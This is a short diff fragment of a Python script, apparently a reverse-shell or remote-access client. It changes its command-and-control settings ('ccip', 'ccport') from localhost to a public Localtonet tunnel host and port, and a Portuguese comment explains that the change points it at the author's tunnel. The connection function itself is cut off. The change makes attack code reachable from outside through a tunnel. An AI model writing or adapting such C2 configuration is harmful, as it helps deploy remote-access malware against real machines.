@@ -6,9 +6,9 @@ import os
 import sys
 import platform
 
-# Configurações de Conexão (Altere para o IP do seu Termux ou servidor de testes)
-ccip = "127.0.0.1" 
-ccport = 443
+# Configuração gerada pelo seu túnel Localtonet
+ccip = "c9zpn4cvhs.localto.net"
+ccport = 4985
 
 def conn(ccip, ccport):
     try:
